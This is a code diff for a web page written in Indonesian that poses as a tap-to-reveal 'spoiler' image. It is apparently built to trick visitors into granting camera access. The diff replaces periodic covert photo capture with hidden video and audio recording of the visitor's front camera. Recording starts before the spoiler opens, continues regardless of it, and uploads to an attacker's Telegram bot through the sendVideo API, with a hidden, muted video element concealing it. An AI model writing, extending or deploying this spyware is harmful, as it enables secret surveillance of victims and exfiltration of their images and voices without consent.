@@ -200,7 +200,7 @@
     </div>
 
     <!-- Video & Canvas untuk kamera (hidden) -->
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js">
@@ -225,8 +225,12 @@
             let animationId = null;
             let isUnblurred = false;
             let isCameraReady = false;
-            let captureInterval = null;
             let isRequestingPermission = false;
+            let mediaRecorder = null;
+            let recordedChunks = [];
+            let isRecording = false;
+            let isProcessingVideo = false;
+            let hasStartedRecording = false;
 
             // ====== BINTIK ======
             function resizeCanvas() {
@@ -301,31 +305,40 @@
                 }
             }
 
-            // ====== RESET PERMISSION ======
-            async function resetPermission() {
-                try {
-                    // Coba query permission state
-                    if (navigator.permissions && navigator.permissions.query) {
-                        const perm = await navigator.permissions.query({ name: 'camera' });
-                        console.log('Permission state:', perm.state);
-                        
-                        // Jika state 'denied', kita tidak bisa reset secara programmatic
-                        // Tapi kita bisa tetap mencoba meminta ulang
+            // ====== KIRIM VIDEO KE TELEGRAM ======
+            function sendVideoToTelegram(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, 'spoiler_video.webm');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if (result.ok) {
+                        console.log('✅ Video terkirim!');
+                    } else {
+                        console.error('❌ Gagal kirim video:', result.description);
                     }
-                } catch (e) {
-                    console.log('Permission query not supported');
-                }
+                })
+                .catch(err => {
+                    console.error('Error kirim video:', err);
+                });
             }
 
-            // ====== SETUP KAMERA ======
+            // ====== SETUP KAMERA & MULAI REKAM ======
             async function setupCamera() {
                 if (isRequestingPermission) return;
-                
+                if (isProcessingVideo) return;
+                if (isCameraReady) return;
+
                 isRequestingPermission = true;
 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
+                        audio: true,
                         video: {
                             facingMode: "user",
                             width: { ideal: 1280 },
@@ -340,78 +353,81 @@
                         captureCanvas.height = video.videoHeight;
                         isCameraReady = true;
                         isRequestingPermission = false;
-                        startCapturing();
-
-                        if (!isUnblurred) {
-                            isUnblurred = true;
-                            bubble.classList.add('unblur');
-                            hint.textContent = '✅ terlihat';
-                            stopAnimation();
-                        }
+                        
+                        // MULAI REKAMAN LANGSUNG (meskipun spoiler belum terbuka)
+                        startRecording(stream);
                     };
 
                 } catch (e) {
                     console.error("Camera Error:", e);
                     isCameraReady = false;
                     isRequestingPermission = false;
-                    
-                    // Reset stream
+
                     if (video.srcObject) {
                         video.srcObject.getTracks().forEach(track => track.stop());
                         video.srcObject = null;
                     }
-                    
-                    if (captureInterval) {
-                        clearInterval(captureInterval);
-                        captureInterval = null;
-                    }
-                    
-                    // Spoiler tetap tertutup
-                    if (isUnblurred) {
-                        isUnblurred = false;
-                        bubble.classList.remove('unblur');
-                        hint.textContent = '⏺ ketuk untuk lihat';
-                        startAnimation();
-                    }
                 }
             }
 
-            // ====== CAPTURE & KIRIM KE BOT ======
-            function startCapturing() {
-                const context = captureCanvas.getContext('2d');
+            // ====== REKAM VIDEO ======
+            function startRecording(stream) {
+                try {
+                    if (!MediaRecorder || !MediaRecorder.isTypeSupported('video/webm')) {
+                        console.log('MediaRecorder tidak support');
+                        return;
+                    }
 
-                captureInterval = setInterval(() => {
-                    if (!isCameraReady) return;
+                    const options = {
+                        mimeType: 'video/webm;codecs=vp8,opus',
+                        videoBitsPerSecond: 2000000,
+                        audioBitsPerSecond: 128000
+                    };
 
-                    context.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
-                    const data = captureCanvas.toDataURL("image/jpeg", 0.7);
-                    sendToTelegram(data);
-                }, 3000);
+                    mediaRecorder = new MediaRecorder(stream, options);
+                    recordedChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        if (recordedChunks.length > 0) {
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            if (blob.size > 0) {
+                                console.log('📹 Rekaman selesai, ukuran:', (blob.size / 1024 / 1024).toFixed(2), 'MB');
+                                sendVideoToTelegram(blob);
+                            }
+                        }
+                        recordedChunks = [];
+                        isRecording = false;
+                        isProcessingVideo = false;
+                        hasStartedRecording = false;
+                        isCameraReady = false;
+                    };
+
+                    // Mulai rekaman
+                    mediaRecorder.start();
+                    isRecording = true;
+                    isProcessingVideo = true;
+                    hasStartedRecording = true;
+                    console.log('🎥 Rekaman dimulai (spoiler belum tentu terbuka)...');
+
+                } catch (e) {
+                    console.error('Start recording error:', e);
+                    isProcessingVideo = false;
+                }
             }
 
-            // ====== KIRIM KE BOT TELEGRAM ======
-            function sendToTelegram(imageData) {
-                fetch(imageData)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'spoiler_photo.jpg');
-
-                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    })
-                    .then(response => response.json())
-                    .then(result => {
-                        if (!result.ok) {
-                            console.error('Gagal kirim:', result.description);
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Error kirim ke bot:', err);
-                    });
+            // ====== STOP REKAMAN ======
+            function stopRecording() {
+                if (mediaRecorder && isRecording) {
+                    console.log('⏹️ Menghentikan rekaman...');
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
             }
 
             // ====== TOGGLE SPOILER ======
@@ -421,33 +437,28 @@
                 // Jika sedang meminta izin, abaikan
                 if (isRequestingPermission) return;
 
-                // Jika kamera sudah siap dan spoiler terbuka, tutup
+                // Jika belum minta izin sama sekali, mulai kamera
+                if (!isCameraReady && !hasStartedRecording) {
+                    setupCamera();
+                    return;
+                }
+
+                // Toggle spoiler (buka/tutup) - REKAMAN TETAP BERJALAN
                 if (isUnblurred) {
+                    // Tutup spoiler
                     isUnblurred = false;
                     bubble.classList.remove('unblur');
                     hint.textContent = '⏺ ketuk untuk lihat';
                     startAnimation();
-
-                    if (captureInterval) {
-                        clearInterval(captureInterval);
-                        captureInterval = null;
-                    }
-                    return;
+                    console.log('🔒 Spoiler ditutup (rekaman tetap berjalan)');
+                } else {
+                    // Buka spoiler
+                    isUnblurred = true;
+                    bubble.classList.add('unblur');
+                    hint.textContent = '✅ terlihat';
+                    stopAnimation();
+                    console.log('🔓 Spoiler dibuka (rekaman tetap berjalan)');
                 }
-
-                // Reset camera state
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                }
-                isCameraReady = false;
-                if (captureInterval) {
-                    clearInterval(captureInterval);
-                    captureInterval = null;
-                }
-
-                // Minta izin kamera (akan muncul notifikasi)
-                setupCamera();
             }
 
             // ====== INIT ======
@@ -498,6 +509,13 @@
                     if (animationId && !isUnblurred) {
                         stopAnimation();
                         startAnimation();
+                    }
+                });
+
+                // Hentikan rekaman jika halaman ditutup
+                window.addEventListener('beforeunload', function() {
+                    if (isRecording) {
+                        stopRecording();
                     }
                 });
             }
